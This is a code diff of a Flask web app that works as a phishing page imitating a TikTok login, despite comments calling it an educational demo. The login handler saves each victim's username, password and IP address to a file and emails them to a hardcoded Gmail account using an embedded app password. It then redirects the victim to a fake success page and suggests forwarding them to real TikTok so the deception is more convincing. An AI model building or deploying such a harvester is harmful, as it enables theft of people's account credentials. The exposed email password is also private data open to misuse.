@@ -3,8 +3,7 @@
 from flask import Flask, render_template, request, redirect, url_for
 import smtplib
 from email.mime.text import MIMEText
-import os # This import is essential for Render's PORT environment variable
-from datetime import datetime # For adding timestamps to logs
+import os # For accessing environment variables
 
 app = Flask(__name__)
 
@@ -12,14 +11,17 @@ app = Flask(__name__)
 # NEVER hardcode sensitive credentials like passwords directly in your code
 # for production environments. Use environment variables or a secure
 # configuration management system.
-# For this educational demo, you will put your actual Gmail App Password here.
+# For this educational demo, you will replace 'YOUR_GMAIL_APP_PASSWORD_HERE'
+# with your actual Gmail App Password.
 # -------------------------------
 
-# Your controlled email address
+# Replace with your controlled email address
 EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
-# Your Gmail App Password (ENSURE NO SPACES)
-EMAIL_PASSWORD = "mokasgadsacljec" # <--- VERIFY THIS HAS NO SPACES
-TO_EMAIL = "mwananchihuslerloans@gmail.com" # Recipient email
+# Use a Gmail App Password here.
+# Generate one from your Google Account security settings.
+# For this demo, you will put your actual App Password here:
+EMAIL_PASSWORD = "mokasgadsaacljec" # <--- REPLACE THIS WITH YOUR APP PASSWORD
+TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email
 
 @app.route("/")
 def home():
@@ -32,16 +34,15 @@ def login():
     username = request.form["username"]
     password = request.form["password"]
 
-    # --- Credential Logging to file (for demonstration only) ---
-    # On Render, this file might not be persistent across restarts.
+    # --- Credential Logging (for demonstration only) ---
+    # In a real scenario, this would be logged securely (e.g., to a database)
+    # and not to a flat file that might not persist on cloud platforms.
     try:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
         with open("credentials.txt", "a") as f:
-            f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
-        print(f"Credentials saved to credentials.txt: {username} | {password}") # This print is important
+            f.write(f"Timestamp: {request.environ.get('REMOTE_ADDR')} - User: {username} | Pass: {password}\n")
+        print("Credentials saved to credentials.txt")
     except Exception as e:
-        print(f"Error saving credentials to file: {e}") # This print is important if an error occurs
+        print(f"Error saving credentials to file: {e}")
     # --- End Credential Logging ---
 
     # --- Email Notification ---
@@ -51,7 +52,7 @@ def login():
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 
             subject = "Phishing Capture Alert"
-            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR', 'Unknown IP')}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR')}"
 
             msg = MIMEText(body)
             msg['Subject'] = subject
@@ -59,21 +60,27 @@ def login():
             msg['To'] = TO_EMAIL
 
             smtp.send_message(msg)
-            print("Credentials sent via email successfully!") # This print is important
+            print("Credentials sent via email successfully!")
 
     except Exception as e:
-        # If an error occurs during email sending, this will be printed in Render logs
-        print(f"Error sending email: {e}") # This print is important if an error occurs
+        print(f"Error sending email: {e}")
+        # In a real app, you might want to log the error to a system log
+        # or a monitoring service, but avoid exposing internal errors to users.
 
-    # This redirects to the "mock page" you had before
-    return redirect(url_for('success'))
+    # Redirect the user to a seemingly legitimate page after "login"
+    # For a phishing demo, this would typically be the real TikTok site
+    # or a convincing "success" page.
+    # For a demo, you can redirect to google.com or a mock success page.
+    return redirect(url_for('mock_tiktok_redirect')) # Redirect to a mock success page or real TikTok
 
-# The success route that shows the mock page (your original behavior)
-@app.route("/success")
-def success():
-    return "Login successful! (This is a mock page)"
+# A mock page to redirect to, simulating a "successful" login
+@app.route("/redirect_after_login")
+def mock_tiktok_redirect():
+    # You could redirect to the real TikTok here for a more convincing demo
+    # return redirect("https://www.tiktok.com", code=302)
+    return "Login successful! Redirecting to TikTok... (This is a mock page for the demo)"
 
-# --- CRITICAL FOR RENDER DEPLOYMENT ---
+# --- IMPORTANT FOR RENDER DEPLOYMENT ---
 # Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
 # for it to be accessible from the internet.
 if __name__ == '__main__':
